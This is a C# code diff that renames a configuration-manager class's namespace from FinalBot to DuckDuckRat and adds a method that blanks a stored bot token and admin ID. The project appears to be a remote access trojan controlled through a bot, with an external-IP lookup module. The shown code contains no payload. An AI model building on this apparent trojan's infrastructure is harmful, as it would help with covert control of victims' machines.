@@ -4,10 +4,10 @@ using System.IO;
 using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
-using VanguardCore;
-using FinalBot.Modules;
+using DuckDuckRat;
+using DuckDuckRat.Modules;
 
-namespace FinalBot
+namespace DuckDuckRat
 {
     public static class ConfigManager
     {
@@ -40,6 +40,18 @@ namespace FinalBot
                 byte[] dec = ProtectedData.Unprotect(b, _sessionSalt, DataProtectionScope.CurrentUser);
                 return Encoding.UTF8.GetString(dec);
             } catch { return ""; }
+        }
+
+        public static void ClearSecrets()
+        {
+            try
+            {
+                if (_config.ContainsKey("BOT_TOKEN")) _config["BOT_TOKEN"] = "";
+                if (_config.ContainsKey("ADMIN_ID")) _config["ADMIN_ID"] = "";
+                // Note: Array.Clear is for byte arrays, strings are null/empty
+                Array.Clear(_sessionSalt, 0, _sessionSalt.Length);
+            }
+            catch { }
         }
 
         public static void Load()
@@ -97,7 +109,7 @@ namespace FinalBot
         }
 
         private static string _cachedIp = null;
-        public static string LastKnownIp => _cachedIp ??= FinalBot.Modules.SystemInfoModule.GetExternalIP();
+        public static string LastKnownIp => _cachedIp ??= DuckDuckRat.Modules.SystemInfoModule.GetExternalIP();
 
         public static string Get(string key, string defaultValue = "")
         {
@@ -119,3 +131,5 @@ namespace FinalBot
         }
     }
 }
+
+
